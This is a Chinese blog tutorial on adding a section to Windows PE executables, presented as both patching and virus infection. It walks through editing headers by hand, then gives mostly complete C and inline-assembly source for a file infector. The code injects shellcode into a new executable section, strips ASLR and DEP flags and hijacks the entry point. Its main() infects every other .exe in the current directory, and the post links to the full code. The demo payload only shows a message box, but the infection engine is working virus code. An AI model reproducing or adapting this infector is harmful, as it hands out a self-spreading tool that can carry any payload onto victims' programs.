---
title: PE文件中添加节区
date: 2017-07-23 16:30:10
tags: [PE文件,添加节区,病毒感染,打补丁]
categories: Windows
keywords: [PE文件,添加节区,病毒感染,打补丁]
---

在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。

打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙中。对于恶意代码而言，以这种方式感染目标文件更具隐蔽性。

当补丁代码或病毒需注入的代码量较大时，可以在 PE 文件的末尾添加一个节区用于存储这些代码。下面介绍如何在 PE 文件中添加一个节区。

### **0x01 手动添加**    
使用 C32asm 可以很方便地定位并修改 PE 文件的各个字段，点击 “查看” / “PE信息” 可打开 PE 结构字段的解析面板。添加节区的具体流程如下。
#### **1）添加一个 IMAGE_SECTION_HEADER**       
首先在原来节表的末尾添加一个节表，IMAGE_SECTION_HEADER 结构体中要设置的字段有以下6个：
```
Name: .new
VirtualSize: 0x450 // 该字段可不用对齐
VirtualAddress: 0x9000 // 上一节区的 VirtualAddress + 对齐后的 VirtualSize
SizeOfRawData: 0x600 // 该字段为对齐后的值
PointerToRawData: 0x5200 // 上一节区的 PointerToRawData + SizeOfRawData
Characteristics：0x60000020  // 与 .text段一致
```
![](http://ooyovxue7.bkt.clouddn.com/17-7-21/52134100.jpg)

#### **2）修改 NumberOfSection**    
添加一个节表之后需要修改 IMAGE_FILE_HEADER 中的 NumberOfSection 字段，将节区数量由 4 改为 5。
![](http://ooyovxue7.bkt.clouddn.com/17-7-21/41073536.jpg)

#### **3）修改 SizeOfImage**    
接着修改文件映像大小，即 IMAGE_OPTIONAL_HEADER 中的 SizeOfImage 字段，该字段按内存对齐方式对齐，在原大小（0x9000）的基础上加上新节区的大小（0x450），对齐后为 0xa000。
![](http://ooyovxue7.bkt.clouddn.com/17-7-21/28635670.jpg)

#### **4）添加节区数据**    
最后添加新增节区的数据，把光标移到文件的末尾，点击 “编辑” / “插入数据”，插入数据大小为 1536(0x600)，使用 00 填充，点击确认，保存即可。

到此，已成功添加了一个节区，修改之后的程序仍是可运行的，使用 PEview 查看新增节区如下：
![](http://ooyovxue7.bkt.clouddn.com/17-7-21/90730788.jpg)

![](http://ooyovxue7.bkt.clouddn.com/17-7-21/63364761.jpg)

这里需要注意插入数据的大小要按磁盘对齐方式对齐，不然最终修改后的文件无法运行，并提示“该文件不是有效的 Win32 应用程序”。
### **0x02 编程实现**    
恶意代码为了实现其隐蔽性，在其感染 PE 文件时会将代码执行权交给被插入的代码，所以恶意代码通常会先被执行，执行完后再跳转至原 PE 文件中的代码继续执行。

添加节区主要通过内存映射文件和 PE 操作完成，将文件映射到内存中后可以通过内存指针方便地访问文件。下面主要介绍添加新节区的代码实现。

#### **1）将文件映射到内存**    
首先用 CreateFile() 打开文件，然后使用 CreateFileMapping() 和 MapViewOfFile() 函数把文件映射到内存中。
```C
BOOL InfectFile(TCHAR *fpath)
{
	HANDLE hFile = CreateFile(fpath,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if ( hFile  == INVALID_HANDLE_VALUE){
		return FALSE;
	}
	HANDLE hMapFile = CreateFileMapping(hFile,NULL,PAGE_READWRITE,NULL,NULL,NULL);
	if (!hMapFile){
		CloseHandle(hFile);
		return FALSE;
	}
	PVOID  pHdr = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,NULL,NULL,NULL);
	if (!pHdr){
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}
	...
}
```
CreateFileMapping() 函数定义如下:
```C
HANDLE WINAPI CreateFileMapping(
	HANDLE                hFile,  //handle to the file
	LPSECURITY_ATTRIBUTES lpAttributes, //pointer to SECURITY_ATTRIBUTES structure
	DWORD                 flProtect,  //page protection of the file mapping object
	DWORD                 dwMaximumSizeHigh,
	DWORD                 dwMaximumSizeLow,
	LPCTSTR               lpName
);
```
MapViewOfFile() 函数定义如下：
```C
LPVOID WINAPI MapViewOfFile(
	HANDLE hFileMappingObject,  //handle to a file mapping object
	DWORD  dwDesiredAccess, //type of access to a file mapping object
	DWORD  dwFileOffsetHigh,
	DWORD  dwFileOffsetLow,
	SIZE_T dwNumberOfBytesToMap //number of bytes of a file mapping to map to the view
);
```

#### **2）检查 PE 文件**    
文件映射后要检查是否为有效的 PE 文件，同时为了避免重复感染，需要检查目标文件是否已被感染。
```C
BOOL InfectFile(TCHAR *fpath)
{
	...
	// 判断是否为正常PE文件
	if (!IsPeFile(pHdr)){
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	//判断是否已被感染
	if (IsInfected(pHdr)){
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}
	...
}
```
IsPeFile() 和 IsInfected() 函数的实现如下：
```C
/*
检查是否为正常PE文件
*/
BOOL IsPeFile(PVOID pHdr)
{
	//判断DOS头标志是否正确
	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;
	if (p1->e_magic != IMAGE_DOS_SIGNATURE){
		return FALSE;
	}
	//判断PE头标志是否正确
	IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1->e_lfanew);
	if (p2->Signature != IMAGE_NT_SIGNATURE){
		return FALSE;
	}
	return TRUE;
}

/*
判断文件是否被感染
*/
BOOL IsInfected(PVOID pHdr)
{
	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;
	//判断DOS头的保留位是否已被填充为 0xABCD
	if ( p->e_res2[0] == (WORD)INFECTFLAG){
		return TRUE;
	}
	else{
		p->e_res2[0] = (WORD)INFECTFLAG;
		return FALSE;
	}
}
```

#### **3）添加节表**    
添加一个节区需要在 PE 文件中添加一个节表，此外还需修改 NumberOfSections 和 SizeOfImage 字段。

```C
BOOL InfectFile(TCHAR *fpath)
{
	...
	//PE头指针： 文件头指针+DOS头的e_lfanew位指定的PE头偏移
	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)->e_lfanew);
	//节区头指针： PE头指针+PE头的长度
	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + sizeof(IMAGE_NT_HEADERS));

	//两个对齐单位
	DWORD dwFileAlign = pNTHdr->OptionalHeader.FileAlignment;
	DWORD dwSecAlign  = pNTHdr->OptionalHeader.SectionAlignment;
	//最后一个节指针
	IMAGE_SECTION_HEADER *pLastSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections-1];
	//定义一个新节
	IMAGE_SECTION_HEADER *pNewSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections];
	//原入口地址（OEP）
	DWORD dwOldOEP = pNTHdr->OptionalHeader.AddressOfEntryPoint + pNTHdr->OptionalHeader.ImageBase;
	//需插入的代码长度
	DWORD dwCodeSize  = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;

	//填充新节表的各字段
	memcpy(pNewSec->Name,".new",5);
	pNewSec->Misc.VirtualSize = dwCodeSize;
	pNewSec->VirtualAddress		=	pLastSec->VirtualAddress + Align(pLastSec->Misc.VirtualSize, dwSecAlign);
	pNewSec->SizeOfRawData		=	Align(dwCodeSize,dwFileAlign);
	pNewSec->PointerToRawData	=	pLastSec->PointerToRawData + pLastSec->SizeOfRawData;
	pNewSec->Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;

	//节区数目加 1
	pNTHdr->FileHeader.NumberOfSections++;
	//修正PE镜像大小
	pNTHdr->OptionalHeader.SizeOfImage += Align(pNewSec->Misc.VirtualSize,dwSecAlign);
 	...
}
```
VS2010 中默认设置时，计算 Shellcode 长度时无法正确获取函数在内存中的地址，需要将修改项目属性：配置属性/链接器/常规/关闭增量链接。

#### **4）插入节区数据**    
病毒通常会将带有恶意行为的代码插入新节区的数据段，被插入的代码称为 Shellcode，这里只是插入一段弹消息框的代码，Shellcode 通常使用汇编实现，下面是内联汇编代码：
```
void __declspec(naked) ShellcodeStart()
{
	__asm {
			pushad
			call    routine

	routine :
			pop     ebp
			sub      ebp, offset routine
			push    0                                // MB_OK
			lea       eax, [ebp + szCaption]
			push    eax                              // lpCaption
			lea	   eax, [ebp + szText]
			push    eax                              // lpText
			push    0                                // hWnd
			mov     eax, 0xAAAAAAAA
			call      eax                            // MessageBoxA

			popad
			push    0xBBBBBBBB                       // OEP
			ret

	szCaption :
			db('V') db('i') db('r') db('u') db('s') db(0)
	szText :
			db('I') db('n') db('f') db('l') db('e') db('c') db('t') db(' ') db('s')
			db('u') db('c') db('c') db('e') db('s') db('s') db(' ') db('!') db(0)
	}
}
```
从以上代码可知，Shellcode 执行完后会 ret 到原入口地址（OEP）处继续执行。Shellcode 中 MessageBoxA 函数的地址和 OEP 只是占位符，需要在运行时修正这两个地址。

大多数程序都会加载 user32.dll， 并且在同一系统中，user32.dll 会被加载到自身固有的 ImageBase，而 MessageBoxA 是该动态链接库的一个导出函数，所以同一系统中运行的所有进程的 MessageBoxA 函数地址是相同的。
```C
BOOL InfectFile(TCHAR *fpath)
{
	...
	//动态获取 MessageBoxA 函数地址
	HMODULE hModule = LoadLibraryA("user32.dll");
	LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");

	//修改 shellcode 中 MessabeBoxA 和 OEP 的地址
	HANDLE hHeap = HeapCreate(NULL,NULL,dwCodeSize);
	LPVOID lpHeap = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwCodeSize);
	memcpy(lpHeap,ShellcodeStart,dwCodeSize);

	DWORD dwIncrementor = 0;
	for(;dwIncrementor < dwCodeSize; dwIncrementor++){
		//修改 MessageBoxA 地址
		if(*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA){
			*((LPDWORD)lpHeap +dwIncrementor) = (DWORD)lpAddress;
		}
		//修改原 OEP 地址
		if(*((LPDWORD)lpHeap + dwIncrementor) == 0xBBBBBBBB){
			*((LPDWORD)lpHeap +dwIncrementor) = dwOldOEP;
			FreeLibrary(hModule);
			break;
		}
	}

	//复制shellcode到新节区
	DWORD dwSize = 0;
	SetFilePointer(hFile,NULL,NULL,FILE_END);
	WriteFile(hFile,lpHeap,pNewSec->SizeOfRawData,&dwSize,NULL);
	HeapFree(hHeap,NULL,lpHeap);
	HeapDestroy(hHeap);
}
```
修正 Shellcode 中地址之后将其复制到 PE 文件的末尾，首先使用 SetFilePointer() 函数将文件指针指向文件末尾，再通过 WriteFile() 函数将 Shellcode 函数写入文件。SetFilePointer() 函数定义如下：
```C
DWORD WINAPI SetFilePointer(
	HANDLE hFile, //A handle to the file
 	LONG   lDistanceToMove,
 	PLONG  lpDistanceToMoveHigh,
 	DWORD  dwMoveMethod //The starting point for the file pointer move
);
```
#### **5）关闭目标程序 ASLR**
由于 Shellcode 中 MessageBoxA() 函数地址和原 OEP 都是硬编码的，而在 Windows Vista 系统开始都默认启用 ASLR，所以目标程序每次启动时加载到内存的地址(ImageBase)都不同，导致 Shellcode 在跳转至原入口地址时因地址错误而不能正常执行。

普通的 EXE 文件不存在 .reloc 节区，编译器默认情况下都启用 ASLR（“目属性/链接器/高级/随机基址” 可关闭 ASLR），所以编译生成的可执行文件会包含用于重定位的 .reloc 节区。PE 文件中与 ASLR 相关的字段主要有以下几个：
```
IMAGE_FILE_HEADER/Characteristics：关闭 ASLR 时才设置 IMAGE_FILE_RELOCS_STRIPPED 属性值    
IMAGE_OPTIONAL_HEADER/DllCharacteristics：开启 ASLR 时才设置 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 属性值
IMAGE_OPTIONAL_HEADER/DataDirectory[5]：该字段为 Base Relocation Table，ASLR 关闭时该字段值为 0。
```
下面通过编程的方式关闭目标程序的 ASLR：
```C
BOOL InfectFile(TCHAR *fpath)
{
	...
	//关闭目标程序 ASLR
	pNTHdr->FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
	pNTHdr->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	pNTHdr->OptionalHeader.DataDirectory[5].VirtualAddress = 0;
	pNTHdr->OptionalHeader.DataDirectory[5].Size = 0;
 	...
}
```
注：     
IMAGE_OPTIONAL_HEADER/DllCharacteristics 中 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 为与 DEP 相关的属性值，开启 DEP 时会设置改属性值，同样可以用以下代码关闭目标程序的 DEP：
```C
	pNTHdr->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
```
#### **6）修改入口地址 OEP**    
为了让新添加节区中的代码获得优先执行权，要把程序的入口地址设置为新节区的起始地址，即新节表中 VirtualAddress 的值。修改完后调用 FlushViewOfFile() 函数将对文件的修改写入到磁盘中。
```C
BOOL InfectFile(TCHAR *fpath)
{
 	...
	//设置新增节区起始地址为新的入口地址
	pNTHdr->OptionalHeader.AddressOfEntryPoint = pNewSec->VirtualAddress;

	FlushViewOfFile(pHdr,pNTHdr->OptionalHeader.SizeOfHeaders);
	UnmapViewOfFile(pHdr);
	CloseHandle(hMapFile);
	CloseHandle(hFile);

	return TRUE;
}
```
#### **6）测试**    
以下代码遍历当前目录下所有.exe 文件，并感染除程序自身外的所有.exe文件。
```C
int main(void)
{
	WIN32_FIND_DATA FileInfo;
	HANDLE hListFile;
	TCHAR szFilePath[MAX_PATH];
	TCHAR szCurrentPath[MAX_PATH];
	TCHAR szCurrentModule[MAX_PATH];

	//获取当前目录
	GetCurrentDirectory(MAX_PATH,szCurrentPath);
	//获取当前模块路径
	GetModuleFileName(NULL,szCurrentModule,MAX_PATH);
	lstrcpy(szFilePath,szCurrentPath);
	lstrcat(szFilePath,L"\\*.exe");

	//遍历当前目录并感染除自身外的所有.exe文件
	hListFile = FindFirstFile(szFilePath,&FileInfo);
	if(hListFile == INVALID_HANDLE_VALUE){
		return 0;
	}
	else{
		do{
			if(!_tcsstr(szCurrentModule,FileInfo.cFileName)){
				//感染目标文件
				if (!InfectFile(FileInfo.cFileName)){
					return 0;
				}
			}
		}while(FindNextFile(hListFile,&FileInfo));
	}
}
```
运行被感染后的文件，会弹出以下消息框，使用 PEview 可以看到添加了一个名为 .new 的节区。
![](http://ooyovxue7.bkt.clouddn.com/17-7-23/33815689.jpg)

完整代码可以在 [此链接](https://github.com/0x4C43/InflectPE) 下载。
____
References:   
[1] [PE File Infection](https://0x00sec.org/t/pe-file-infection/401)    
[2] 《小小黑客之路》    
[3] 《黑客编辑揭秘与防范》    
[4] 《逆向工程核心原理》
